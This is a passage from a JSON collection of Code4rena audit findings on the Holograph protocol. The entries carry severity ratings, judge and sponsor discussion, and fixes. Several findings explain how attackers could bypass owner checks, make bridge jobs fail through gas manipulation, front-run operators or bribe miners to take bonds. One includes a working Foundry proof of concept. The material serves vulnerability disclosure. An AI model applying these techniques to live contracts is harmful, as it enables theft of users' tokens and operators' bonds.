        "__141345__",
        "martin",
        "cccz",
        "Dinesh11G",
        "Jeiwan",
        "joestakey",
        "vv7",
        "brgltd",
        "Lambda",
        "Bnke0x0",
        "RedOneN",
        "2997ms",
        "chaduke",
        "ballx",
        "V_B"
      ]
    },
    {
      "id": "5594",
      "title": "[M-01] `isOwner` / `onlyOwner` checks can be bypassed by attacker in ERC721/ERC20 implementations",
      "impact": "MEDIUM",
      "content": "\n[ERC721H.sol#L185](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/abstract/ERC721H.sol#L185)<br>\n[ERC721H.sol#L121](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/abstract/ERC721H.sol#L121)<br>\n\nERC20H and ERC721H are base contracts for NFTs / coins to inherit from. They supply the modifier onlyOwner and function isOwner which are used in the implementations for access control. However, there are several functions which when using these the answer may be corrupted to true by an attacker.\n\nThe issue comes from confusion between calls coming from HolographERC721's fallback function, and calls from actually implemented functions.\n\nIn the fallback function, the enforcer appends an additional 32 bytes of `msg.sender`:\n\n    assembly {\n      calldatacopy(0, 0, calldatasize())\n      mstore(calldatasize(), caller())\n      let result := call(gas(), sload(_sourceContractSlot), callvalue(), 0, add(calldatasize(), 32), 0, 0)\n      returndatacopy(0, 0, returndatasize())\n      switch result\n      case 0 {\n        revert(0, returndatasize())\n      }\n      default {\n        return(0, returndatasize())\n      }\n    }\n\nIndeed these are the bytes read as msgSender:\n\n    function msgSender() internal pure returns (address sender) {\n      assembly {\n        sender := calldataload(sub(calldatasize(), 0x20))\n      }\n    }\n\nand isOwner simply compares these to the stored owner:\n\n    function isOwner() external view returns (bool) {\n      if (msg.sender == holographer()) {\n        return msgSender() == _getOwner();\n      } else {\n        return msg.sender == _getOwner();\n      }\n    }\n\nHowever, the enforcer calls these functions directly in several locations, and in these cases it of course does not append a 32 byte msg.sender. For example, in safeTransferFrom:\n\n    function safeTransferFrom(\n      address from,\n      address to,\n      uint256 tokenId,\n      bytes memory data\n    ) public payable {\n      require(_isApproved(msg.sender, tokenId), \"ERC721: not approved sender\");\n      if (_isEventRegistered(HolographERC721Event.beforeSafeTransfer)) {\n        require(SourceERC721().beforeSafeTransfer(from, to, tokenId, data));\n      }\n      _transferFrom(from, to, tokenId);\n      if (_isContract(to)) {\n        require(\n          (ERC165(to).supportsInterface(ERC165.supportsInterface.selector) &&\n            ERC165(to).supportsInterface(ERC721TokenReceiver.onERC721Received.selector) &&\n            ERC721TokenReceiver(to).onERC721Received(address(this), from, tokenId, data) ==\n            ERC721TokenReceiver.onERC721Received.selector),\n          \"ERC721: onERC721Received fail\"\n        );\n      }\n      if (_isEventRegistered(HolographERC721Event.afterSafeTransfer)) {\n        require(SourceERC721().afterSafeTransfer(from, to, tokenId, data));\n      }\n    }\n\nHere, caller has arbitrary control of the data parameter, and can pass owner's address.When the implementation, SourceERC721(), gets called, beforeSafeTransfer / afterSafeTransfer will behave as if they are called by owner.\n\nTherefore, depending on the actual implementation, derived contracts can lose funds by specifying owner-specific logic.\n\nThis pattern occurs with the following functions, which have an arbitrary data parameter:\n\n*   beforeSafeTransfer / after SafeTransfer\n*   beforeTransfer / afterTransfer\n*   beforeOnERC721Received / afterOnERC721Received\n*   beforeOnERC20Received / aferERC20Received\n\n### Impact\n\nOwner-specific functionality can be initiated on NFT / ERC20 implementation contracts.\n\n### Recommended Mitigation Steps\n\nRefactor the code to represent `msg.sender` information in a bug-free way.\n\n**[gzeon (judge) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/464#issuecomment-1295213520):**\n > Those function do not have the `onlyOwner` modifier so this doesn't seems to be valid. e.g.\n> [StrictERC20H.sol#L220-L228](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/abstract/StrictERC20H.sol#L220-L228)\n\n**[Trust (warden) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/464#issuecomment-1295249488):**\n > isOwner and onlyOwner are utilities implemented in ERC721H, to be used in implementation contracts. The actual implementations are out of scope, and defined by NFT / ERC20 creators. We can see such an example in the SampleERC721.sol file, which indeed uses onlyOwner:\n> ```\n>   function mint(\n>     address to,\n>     uint224 tokenId,\n>     string calldata URI\n>   ) external onlyHolographer onlyOwner {\n>     HolographERC721Interface H721 = HolographERC721Interface(holographer());\n>     if (tokenId == 0) {\n>       _currentTokenId += 1;\n>       while (H721.exists(uint256(_currentTokenId)) || H721.burned(uint256(_currentTokenId))) {\n>         _currentTokenId += 1;\n>       }\n>       tokenId = _currentTokenId;\n>     }\n>     H721.sourceMint(to, tokenId);\n>     uint256 id = H721.sourceGetChainPrepend() + uint256(tokenId);\n>     _tokenURIs[id] = URI;\n>   }\n> ```\n> The submission proves that these modifiers, which ARE in scope, are NOT safe to use in certain function implementations, as they can be bypassed. Since there is no warning label to not use those utilities in the list of functions I mentioned, this could potentially result in real damage to the protocol.\n\n**[gzeon (judge) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/464#issuecomment-1295834895):**\n > Is there a codepath that the Holographer will call mint without appending sender address? This might be easy to misuse (which I doubt) but would be QA at best. Imo the modifier is working as intended and it is the developers responsibility to understand the consequences of making a call from the Holographer (which is a privileged account) regardless. Everything can be misused does not mean they are Med/High risk unless you can provide an actual exploit.\n\n**[Trust (warden) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/464#issuecomment-1295842157):**\n > I have brought up mint() as an example of using onlyOwner in the ERC721 implementation. I will reiterate that the issue is confusion between calls coming from HolographERC721's fallback function, and calls from Enforcer's transferFrom / safeTransferFrom / etc. When the list of functions above (beforeTransferFrom/ afterTransferFrom / etc) are called NOT from the fallback, which happens in transferFrom / safeTransferFrom / onERC20Received, the sender can pass any \"data\" parameter they wish, which will be interpreted by the isOwner function as the passed sender in the last 32 bytes.\n> \n> \"Everything can be misused does not mean they are Med/High risk unless you can provide an actual exploit.\" - The problem is that it will NOT be developer misuse to use isOwner / onlyOwner in ERC721/ERC20 implementation, it's use of inherited functionality (like in SampleERC721.sol example). There is no warning that owner check is not safe from \"beforeOnERC20Received\", for example.  Protocol is likely shooting themselves in the foot if they don't protect from owner checks in these functions.\n> \n> If it is required I have no problem coding example innocent ERC20/ERC721 implementation that is vulnerable to the attack.\n\n**[gzeon (judge) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/464#issuecomment-1296062620):**\n > I will reopen this to let sponsor comment, but intended to judge as QA. Will review when judging.\n\nAlso they can't manipulate unless it is called from the Holographer, which have limited affordance.\n\n**[alexanderattar (Holograph) confirmed and commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/464#issuecomment-1306627521):**\n > This is a valid find. We will revisit the isOwner / onlyOwner modifiers and ensure this is handled appropriately so developers inheriting the mentioned Holograph contracts don't accidentally introduce unexpected logic in their contracts\n\n**[ACC01ADE (Holograph) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/464#issuecomment-1320038876):**\n > Fixing this by ensuring that any calls to implementation contracts from HolographERC20 and HolographERC721 do not call directly, but first have the caller attached to end of calldata so that isOwner and onlyOwner are consistent.\n>\n> [Feature/HOLO-605: C4 medium risk fixes](https://github.com/holographxyz/holograph-protocol/pull/88)\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the ERC20H and ERC721H base contracts, which are used for NFTs and coins to inherit from. They have a modifier and function called onlyOwner and isOwner, which are used for access control. However, there is an issue with the code that can allow an attacker to corrupt the answer to true. \n\nThe issue comes from confusion between calls coming from the fallback function and calls from the implemented functions. In the fallback function, an additional 32 bytes of msg.sender is appended, while in the other functions, the msg.sender is not appended. This can cause the owner-specific logic to be initiated on NFT/ERC20 implementation contracts, which could lead to funds being lost. \n\nThe recommended mitigation step is to refactor the code to represent the msg.sender information in a bug-free way.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "https://github.com/code-423n4/2022-10-holograph-findings/issues/464",
      "tags": [
        "Ownership",
        "msgSender"
      ],
      "finders": [
        "Trust"
      ]
    },
    {
      "id": "5593",
      "title": "[H-08] Gas limit check is inaccurate, leading to an operator being able to fail a job intentionally",
      "impact": "HIGH",
      "content": "\n[HolographOperator.sol#L316](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/src/HolographOperator.sol#L316)<br>\n\nThere's a check at line 316 that verifies that there's enough gas left to execute the `HolographBridge.bridgeInRequest()` with the `gasLimit` set by the user, however the actual amount of gas left during the call is less than that (mainly due to the `1/64` rule, see below).<br>\nAn attacker can use that gap to fail the job while still having the `executeJob()` function complete.\n\n### Impact\n\nThe owner of the bridged token would loose access to the token since the job failed.\n\n### Proof of Concept\n\nBesides using a few units of gas between the check and the actual call, there's also a rule that only 63/64 of the remaining gas would be dedicated to an (external) function call. Since there are 2 external function calls done (`nonRevertingBridgeCall()` and the actual call to the bridge) `~2/64` of the gas isn't sent to the bridge call and can be used after the bridge call runs out of gas.\n\nThe following PoC shows that if the amount of gas left before the call is at least 1 million then the execution can continue after the bridge call fails:\n\n```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ncontract ContractTest is Test {\n    event FailedOperatorJob(bytes32 jobHash);\n    uint256 private _inboundMessageCounter;\n    mapping(bytes32 => bool) private _failedJobs;\n    constructor(){\n        _inboundMessageCounter = 5;\n    }\n    function testGas64() public {\n        this.entryPoint{gas:1000000}();\n    }\n\n    Bridge bridge = new Bridge();\n    event GasLeftAfterFail(uint left);\n\n    function entryPoint() public {\n\n        console2.log(\"Gas left before call: \", gasleft());\n\n        bytes32 hash = 0x987744358512a04274ccfb3d9649da3c116cd6b19c535e633ef8529a80cb06a0;\n\n        try this.intermediate(){\n        }catch{\n            // check out how much gas is left after the call to the bridge failed\n            console2.log(\"Gas left after failure: \", gasleft());\n            // simulate operations done after failure\n            _failedJobs[hash] = true;\n            emit FailedOperatorJob(hash);\n        }\n        ++_inboundMessageCounter;\n        console2.log(\"Gas left at end: \", gasleft());\n\n    }\n\n    function intermediate() public{\n        bridge.bridgeCall();\n    }\n}\n\n\ncontract Bridge{\n    event Done(uint gasLeft);\n\n    uint256[] myArr;\n\n    function bridgeCall() public {\n        for(uint i =1; i <= 100; i++){\n            myArr.push(i);\n        }\n        // this line would never be reached, we'll be out of gas beforehand\n        emit Done(gasleft());\n    }\n}\n\n```\n\nOutput of PoC:\n\n      Gas left before call:  999772\n      Gas left after failure:  30672\n      Gas left at end:  1628\n\nSide note: due to some bug in forge `_inboundMessageCounter` would be considered warm even though it's not necessarily the case. However in a real world scenario we can warm it up if the selected operator is a contract and we'er using another operator contract to execute a job in the same tx beforehand.\n\nReference for the `1/64` rule - [EIP-150](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-150.md). Also check out [evm.codes](https://www.evm.codes/#f1?fork=grayGlacier:\\~:text=From%20the%20Tangerine%20Whistle%20fork%2C%20gas%20is%20capped%20at%20all%20but%20one%2064th%20\\(remaining_gas%20/%2064\\)%20of%20the%20remaining%20gas%20of%20the%20current%20context.%20If%20a%20call%20tries%20to%20send%20more%2C%20the%20gas%20is%20changed%20to%20match%20the%20maximum%20allowed.).\n\n### Recommended Mitigation Steps\n\nModify the required amount of gas left to gasLimit + any amount of gas spent before reaching the `call()`, then multiply it by `32/30` to mitigate the `1/64` rule (+ some margin of safety maybe).\n\n**[gzeon (judge) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/176#issuecomment-1294662144):**\n > There are some risks but would require the nested call gas limit to be pretty high (e.g. 1m used in the poc) to have enough gas (`1/64`) left afterward so that it doesn't revert due to out-of-gas.\n\n**[Trust (warden) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/176#issuecomment-1294682078):**\n > @gzeon - actually this is not a limitation. When the call argument passes a gaslimit which is lower than the available gas, it instantly reverts with no gas wasted. Therefore we will have `64/64` of the gas amount to work with post-revert.<br>\n> I have explained this in duplicate report [`#437`](https://github.com/code-423n4/2022-10-holograph-findings/issues/437).\n\n**[0xA5DF (warden) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/176#issuecomment-1294770261):**\n > > When the call argument passes a gaslimit which is lower than the available gas, it instantly reverts with no gas wasted.\n> \n> You mean *higher* than the available gas?<br>\n> I thought the same, but doing some testing and reading the Yellow Paper it turns out it wouldn't revert just because the gas parameter is higher than the available gas.<br>\n> You can modify the PoC above to test that too.\n\n**[Trust (warden) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/176#issuecomment-1294786488):**\n > You can check this example in Remix:\n> ```\n> contract Storage {\n>     /**\n>      * @dev Return value \n>      * @return value of 'number'\n>      */\n>     function gas_poc() public  returns (uint256, uint256){\n>         uint256 left_gas = gasleft();\n>         address this_address = address(this);\n>         assembly {\n>             let result := call(\n>         /// @dev gas limit is retrieved from last 32 bytes of payload in-memory value\n>             left_gas,\n>             /// @dev destination is bridge contract\n>             this_address,\n>             /// @dev any value is passed along\n>             0,\n>             /// @dev data is retrieved from 0 index memory position\n>             0,\n>             /// @dev everything except for last 32 bytes (gas limit) is sent\n>             0,\n>             0,\n>             0\n>             )\n>         }\n>         uint256 after_left_gas = gasleft();\n>         return (left_gas, after_left_gas);\n>     }\n> \n>     fallback() external {\n> \n>     }\n> }\n> ```\n> We pass a lower gas limit than what we have in the \"call\" opcode, which reverts.<br>\n> The function returns \n> ```\n> {\n> \t\"0\": \"uint256: 3787\",\n> \t\"1\": \"uint256: 3579\"\n> }\n> ```\n> Meaning only the gas consumed by the call opcode was deducted, not 63/64.\n\n**[0xA5DF (warden) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/176#issuecomment-1294800675):**\n > In your example the fallback function is actually being called, it's just doesn't use much gas, I've added an event to confirm that:\n> \n> ```solidity\n> contract Storage {\n>     event Cool();\n>     /**\n>      * @dev Return value \n>      * @return value of 'number'\n>      */\n>     function gas_poc() public  returns (uint256, uint256){\n>         uint256 left_gas = gasleft();\n>         address this_address = address(this);\n>         assembly {\n>             let result := call(\n>         /// @dev gas limit is retrieved from last 32 bytes of payload in-memory value\n>             left_gas,\n>             /// @dev destination is bridge contract\n>             this_address,\n>             /// @dev any value is passed along\n>             0,\n>             /// @dev data is retrieved from 0 index memory position\n>             0,\n>             /// @dev everything except for last 32 bytes (gas limit) is sent\n>             0,\n>             0,\n>             0\n>             )\n>         }\n>         uint256 after_left_gas = gasleft();\n>         return (left_gas, after_left_gas);\n>     }\n> \n>     fallback() external {\n>         emit Cool();\n>     }\n> }\n> ```\n> Output:<br>\n> ![image](https://user-images.githubusercontent.com/108216601/198561406-53968c73-3196-4f94-ad65-9ce4f2877d28.png)\n\n**[gzeon (judge) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/176#issuecomment-1294817386):**\n > A child call can never use more than 63/64 of gasleft post eip-150.\n\n**[Trust (warden) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/176#issuecomment-1294843497):**\n > @0xA5DF - Yeah , it seems my setup when I tested this during the contest was wrong, because it instantly reverted in the CALL opcode.<br>\n> Page 37 of the Yellow book describes the GASCAP as minimum of gasLeft input and current gas counter minus costs:<br>\n> ![image](https://user-images.githubusercontent.com/9900020/198568925-2f91aaed-61e2-454d-b8cf-42e9f1ce1477.png)<br>\n> Thanks for the good direct counterexample.<br>\n> \n> @gzeon - Right, we were discussing if call to child will instantly revert because `requestedGas > availableGas`, but it doesn't.\n\n**[gzeon (judge) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/176#issuecomment-1294849312):**\n > That's true, and the code also doesn't forward a limited amount of gas explicitly too.\n\n**[Trust (warden) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/176#issuecomment-1294854809):**\n > The point was that executor can always craft supplied gas to the contract, so that during the CALL opcode, gas left would be smaller than requested gas limit. If EVM behavior reverts in this check, we have deterministic failing of `bridgeIn`.\n\n**[alexanderattar (Holograph) confirmed and commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/176#issuecomment-1307829065):**\n > Nice find! Gas limit sent by operator could be used maliciously to ensure that job fails. This will be updated to mitigate the issue observed.\n\n**[ACC01ADE (Holograph) resolved](https://github.com/code-423n4/2022-10-holograph-findings/issues/176#event-7817152060):**\n > [Feature/HOLO-604: implementing critical issue fixes](https://github.com/holographxyz/holograph-protocol/pull/84)\n\n\n\n***\n \n",
      "summary": "\nThis bug report is about a vulnerability in the code of a HolographOperator.sol contract. The vulnerability is related to a check at line 316, which verifies that there is enough gas left to execute the HolographBridge.bridgeInRequest() with the gasLimit set by the user. However, due to the 1/64 rule, the actual amount of gas left during the call is less than that. An attacker can use this gap to fail the job while still having the executeJob() function complete.\n\nThe impact of this vulnerability is that the owner of the bridged token would lose access to the token since the job failed. A proof-of-concept code was provided to demonstrate that if the amount of gas left before the call is at least 1 million, then the execution can continue after the bridge call fails.\n\nThe recommended mitigation step is to modify the required amount of gas left to gasLimit + any amount of gas spent before reaching the call(), then multiply it by 32/30 to mitigate the 1/64 rule (+ some margin of safety maybe).",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "https://github.com/code-423n4/2022-10-holograph-findings/issues/176",
      "tags": [
        "Gas Limit",
        "EIP-150",
        "1/64 Rule"
      ],
      "finders": [
        "0xA5DF",
        "Trust  V_B"
      ]
    },
    {
      "id": "5592",
      "title": "[H-07] Failed job can't be recovered. NFT may be lost.",
      "impact": "HIGH",
      "content": "\n[HolographOperator.sol#L329](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L329)<br>\n[HolographOperator.sol#L419-L429](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L419-L429)<br>\n\n```solidity\nfunction executeJob(bytes calldata bridgeInRequestPayload) external payable {\n...\ndelete _operatorJobs[hash];\n...\n    try\n      HolographOperatorInterface(address(this)).nonRevertingBridgeCall{value: msg.value}(\n        msg.sender,\n        bridgeInRequestPayload\n      )\n    {\n      /// @dev do nothing\n    } catch {\n      _failedJobs[hash] = true;\n      emit FailedOperatorJob(hash);\n    }\n}\n```\n\nFirst, it will `delete _operatorJobs[hash];` to have it not replayable.\n\nNext, assume `nonRevertingBridgeCall` failed. NFT won't be minted and the catch block is entered.\n\n`_failedJobs[hash]` is set to true and event is emitted\n\nNotice that `_operatorJobs[hash]` has been deleted, so this job is not replayable. This mean NFT is lost forever since we can't retry executeJob.\n\n### Recommended Mitigation Steps\n\nMove `delete _operatorJobs[hash];` to the end of function executeJob covered in `if (!_failedJobs[hash])`\n\n```solidity\n...\nif (!_failedJobs[hash]) delete _operatorJobs[hash];\n...\n```\n\nBut this implementation is not safe. The selected operator may get slashed. Additionally, you may need to check `_failedJobs` flag to allow retry for only the selected operator.\n\n**[gzeon (judge) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/102#issuecomment-1296298124):**\n > While the use of non-blocking call is good to unstuck operator, consider making the failed job still executable by anyone (so the user can e.g. use a higher gas limit) to avoid lost fund. Kinda like how Arbitrum retryable ticket works. Can be high risk due to asset lost.\n\n**[Trust (warden) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/102#issuecomment-1296346691):**\n > I think it's a design choice to make it not replayable. Sponsor discussed having a refund mechanism at the source chain, if we were to leave it replayable the refunding could lead to double mint attack.\n\n**[alexanderattar (Holograph) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/102#issuecomment-1307872286):**\n > This is a valid point and the desired code is planned but wasn't implemented in time for the audit. We will add logic to handle this case.\n\n**[gzeon (judge) increased severity to High and commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/102#issuecomment-1320929853):**\n > Since asset can be lost, I think it is fair to judge this as High risk.\n\n**[alexanderattar (Holograph) resolved and commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/102#issuecomment-1351772822):**\n > We have a fix for this: https://github.com/holographxyz/holograph-protocol/pull/98/files#diff-552f4c851fa3089f9c8efd33a2f10681bc27743917bb63000a5d19d5b41e0d3f\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of the HolographOperator.sol contract on the github repository code-423n4/2022-10-holograph. The vulnerability can lead to a failed job not being recoverable and the NFT associated with that job being lost. The code in question is located at lines 329 and 419-429. \n\nThe vulnerability occurs when the nonRevertingBridgeCall fails. The code will delete the _operatorJobs[hash] and set _failedJobs[hash] to true and emit the FailedOperatorJob event. This means that the job is not replayable and the NFT is lost forever.\n\nThe recommended mitigation steps for this vulnerability are to move the delete _operatorJobs[hash] to the end of the function executeJob, but this implementation is not safe. The selected operator may get slashed and additional checks may need to be added to allow retries for only the selected operator.",
      "quality_score": 4,
      "rarity_score": 2,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "https://github.com/code-423n4/2022-10-holograph-findings/issues/102",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "0xA5DF",
        "0x52",
        "ladboy233",
        "Chom",
        "adriro"
      ]
    },
    {
      "id": "5591",
      "title": "[H-06] Gas price spikes cause the selected operator to be vulnerable to frontrunning and be slashed",
      "impact": "HIGH",
      "content": "\n[HolographOperator.sol#L354](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L354)<br>\n\n```solidity\nrequire(gasPrice >= tx.gasprice, \"HOLOGRAPH: gas spike detected\");\n```\n\n```solidity\n        /**\n         * @dev select operator that failed to do the job, is slashed the pod base fee\n         */\n        _bondedAmounts[job.operator] -= amount;\n        /**\n         * @dev the slashed amount is sent to current operator\n         */\n        _bondedAmounts[msg.sender] += amount;\n```\n\nSince you have designed a mechanism to prevent other operators to slash the operator due to \"the selected missed the time slot due to a gas spike\". It can induce that operators won't perform their job if a gas price spike happens due to negative profit.\n\nBut your designed mechanism has a vulnerability. Other operators can submit their transaction to the mempool and queue it using `gasPrice in bridgeInRequestPayload`. It may get executed before the selected operator as the selected operator is waiting for the gas price to drop but doesn't submit any transaction yet. If it doesn't, these operators lose a little gas fee. But a slashed reward may be greater than the risk of losing a little gas fee.\n\n```solidity\nrequire(timeDifference > 0, \"HOLOGRAPH: operator has time\");\n```\n\nOnce 1 epoch has passed, selected operator is vulnerable to slashing and frontrunning.\n\n### Recommended Mitigation Steps\n\nModify your operator node software to queue transactions immediately with `gasPrice in bridgeInRequestPayload` if a gas price spike happened. Or allow gas fee loss tradeoff to prevent being slashed.\n\n**[alexanderattar (Holograph) confirmed and commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/44#issuecomment-1307886755):**\n > Valid, we have not fully finalized this mechanism and will consider mitigation strategies.\n\n**[gzeon (judge) increased severity to High and commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/44#issuecomment-1320927380):**\n > High risk because potential slashing.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the vulnerability of the HolographOperator.sol code on the code-423n4/2022-10-holograph GitHub repository. The vulnerability allows operators to be vulnerable to frontrunning and be slashed due to gas price spikes. This can be done by submitting a transaction to the mempool and queueing it with the gasPrice in bridgeInRequestPayload. If the selected operator does not submit a transaction, they risk being slashed. \n\nThe recommended mitigation steps are to modify the operator node software to queue transactions immediately with gasPrice in bridgeInRequestPayload if a gas price spike happens, or allow gas fee loss tradeoff to prevent being slashed. \n\nIn conclusion, the bug report is about a vulnerability in the HolographOperator.sol code that allows operators to be vulnerable to frontrunning and be slashed due to gas price spikes. The recommended mitigation steps are to modify the operator node software to queue transactions immediately with gasPrice in bridgeInRequestPayload if a gas price spike happens, or allow gas fee loss tradeoff to prevent being slashed.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "https://github.com/code-423n4/2022-10-holograph-findings/issues/44",
      "tags": [
        "Gas Price",
        "Front-Running"
      ],
      "finders": [
        "Lambda  Trust",
        "Chom"
      ]
    },
    {
      "id": "5590",
      "title": "[H-05] MEV: Operator can bribe miner and steal honest operator's bond amount if gas price went high",
      "impact": "HIGH",
      "content": "\n[HolographOperator.sol#L354](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L354)<br>\n\nOperators in Holograph do their job by calling executeJob() with the bridged in bytes from source chain.<br>\nIf the primary job operator did not execute the job during his allocated block slot, he is punished by taking a single bond amount and transfer it to the operator doing it instead.<br>\nThe docs and code state that if there was a gas spike in the operator's slot, he shall not be punished. The way a gas spike is checked is with this code in executeJob:\n\n    require(gasPrice >= tx.gasprice, \"HOLOGRAPH: gas spike detected\");\n\nHowever, there is still a way for operator to claim primary operator's bond amount although gas price is high. Attacker can submit a flashbots bundle including the executeJob() transaction, and one additional \"bribe\" transaction. The bribe transaction will transfer some incentive amount to coinbase address (miner), while the executeJob is submitted with a low gasprice. Miner will accept this bundle as it is overall rewarding enough for them, and attacker will receive the base bond amount from victim operator. This threat is not theoretical because every block we see MEV bots squeezing value from such opportunities.\n\ninfo about coinbase [transfer](https://docs.flashbots.net/flashbots-auction/searchers/advanced/coinbase-payment)<br>\ninfo about bundle [selection](https://docs.flashbots.net/flashbots-auction/searchers/advanced/bundle-pricing#bundle-ordering-formula)\n\n### Impact\n\nDishonest operator can take honest operator's bond amount although gas price is above acceptable limits.\n\n### Tools Used\n\nManual audit, flashbot docs\n\n### Recommended Mitigation Steps\n\nDo not use current tx.gasprice amount to infer gas price in a previous block.<br>\nProbably best to use gas price oracle.\n\n**[gzeon (judge) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/473#issuecomment-1297061061):**\n > Note that this is not possible with 1559 due to block base fee, but might be possible in some other chain.\n\n**[alexanderattar (Holograph) disputed and commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/473#issuecomment-1306625799):**\n > EIP-1559 does not allow for tx gas less than block base fee\n\n**[Trust (warden) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/473#issuecomment-1306728092):**\n > Dispute: it is incorrect to assume bridge request sender did not add a priority fee, making it possible to bribe with `tx.gasprice < gasPrice`.<br>\n> Also, cannot assume all chains in the multichain implement EIP1559.\n\n**[ACC01ADE (Holograph) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/473#issuecomment-1308918221):**\n > The EIP-1559 for all EVM chains assumption is the gotcha here. I don't really see a solution for this at the moment. 🤔 \n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the HolographOperator.sol contract, which is part of the 2022-10-holograph repository on GitHub. The vulnerability allows a dishonest operator to take an honest operator's bond amount, even when the gas price is above the acceptable limit. This threat is not theoretical as it is already being exploited in the real world.\n\nThe vulnerability occurs when the executeJob() function is called with the bridged in bytes from the source chain. The code in executeJob checks the gas price against the tx.gasprice, but there is a way for an attacker to submit a flashbots bundle including the executeJob() transaction and a bribe transaction. The bribe transaction transfers an incentive amount to the coinbase address of the miner, while the executeJob is submitted with a low gasprice. As the bundle is overall rewarding, the miner will accept it, and the attacker will receive the base bond amount from the victim operator.\n\nThe impact of this vulnerability is that dishonest operators can take honest operator's bond amount, even when the gas price is above the acceptable limits. To mitigate this, it is recommended to not use the current tx.gasprice amount to infer gas price in a previous block, and to use a gas price oracle instead.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "https://github.com/code-423n4/2022-10-holograph-findings/issues/473",
      "tags": [
        "Gas Price",
        "Flashbot"
      ],
      "finders": [
        "Trust"
      ]
    },
    {
      "id": "5589",
      "title": "[H-04] An attacker can manipulate each pod and gain an advantage over the remainder Operators",
      "impact": "HIGH",
      "content": "\nIn [contracts/HolographOperator.sol#crossChainMessage](https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L484-L539), each Operator is selected by:\n\n*   Generating a random number ([L499](https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L499))\n*   A pod is selected by dividing the random with the total number of pods, and using the remainder ([L503](https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L503))\n*   An Operator of the selected pod is chosen using the **same** random and dividing by the total number of operators ([L511](https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L511)).\n\nThis creates an unintended bias since the first criterion (the `random`) is used for both selecting the pod and selecting the Operator, as explained in a previous issue (`M001-Biased distribution`). In this case, an attacker knowing this flaw can continuously monitor the contracts state and see the current number of pods and Operators. Accordingly to the [documentation](https://docs.holograph.xyz/holograph-protocol/operator-network-specification#operator-job-selection) and provided [flow](https://github.com/code-423n4/2022-10-holograph/blob/main/docs/IMPORTANT_FLOWS.md#joining-pods):\n\n*   An Operator can easily join and leave a pod, albeit when leaving a small fee is paid\n*   An Operator can only join one pod, but an attacker can control multiple Operators\n*   The attacker can then enter and leave a pod to increase (unfairly) his odds of being selected for a job\n\nHonest Operators may feel compelled to leave the protocol if there are no financial incentives (and lose funds in the process), which can also increase the odds of leaving the end-users at the hands of a malicious Operator.\n\n### Proof of Concept\n\nConsider the following simulation for 10 pods with a varying number of operators follows (X → \"does not apply\"):\n\n| Pod n | Pon len | Op0 | Op1 | Op2 | Op3 | Op4 | Op5 | Op6 | Op7 | Op8 | Op9 | 